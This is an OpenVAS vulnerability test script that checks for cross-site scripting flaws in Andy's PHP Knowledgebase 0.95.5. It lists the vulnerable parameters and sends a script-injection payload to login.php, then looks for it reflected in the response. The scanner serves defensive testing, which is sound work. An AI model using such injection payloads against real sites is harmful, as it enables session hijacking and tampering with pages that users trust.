###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_aphpkb_mult_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Andy's PHP Knowledgebase Multiple Cross-Site Scripting Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to insert arbitrary HTML and
  script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "Andy's PHP Knowledgebase version 0.95.5 and prior.";
tag_insight = "The flaws are caused by improper validation of user-supplied input passed
  via the 'username' parameter in login.php and forgot_password.php,
  'first_name', 'last_name', 'email', 'username' parameters in register.php,
  and 'keyword_list' parameter in keysearch.php, that allows attackers to
  execute arbitrary HTML and script code on the web server.";
tag_solution = "No solution or patch is available as of 1st August, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://aphpkb.sourceforge.net/";
tag_summary = "This host is running Andy's PHP Knowledgebase and is prone to
  multiple cross site scripting vulnerabilities.";

if(description)
{
  script_id(802225);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-08-02 09:08:31 +0200 (Tue, 02 Aug 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Andy's PHP Knowledgebase Multiple Cross-Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secpod.org/blog/?p=220");
  script_xref(name : "URL" , value : "http://secpod.org/advisories/SECPOD_APHPKB_XSS.txt");

  script_description(desc);
  script_summary("Check if Andy's PHP Knowledgebase is prone to XSS vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_aphpkb_detect.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!get_port_state(port)) {
  exit(0);
}

## Chek Host Supports PHP
if(!can_host_php(port:port)) {
  exit(0);
}

## Get Andy's PHP Knowledgebase Installed Location
if(!dir = get_dir_from_kb(port:port, app:"aphpkb")){
  exit(0);
}

## Construct the Attack Request
postData = string('username="><script>alert("OpenVAS-XSS-Test")</script>',
                  '&password=&submit=Login');

## Construct XSS post attack request
req = string("POST ", dir, "/login.php HTTP/1.1\r\n",
             "Host: ", get_host_name(), "\r\n",
             "User-Agent: OpenVAS\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(postData), "\r\n\r\n", postData);

## Try XSS Attack
res = http_send_recv(port:port, data:req);

## Confirm exploit worked by checking the response
if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:res) &&
  ('><script>alert("OpenVAS-XSS-Test")</script>' >< res)){
  security_warning(port);
}
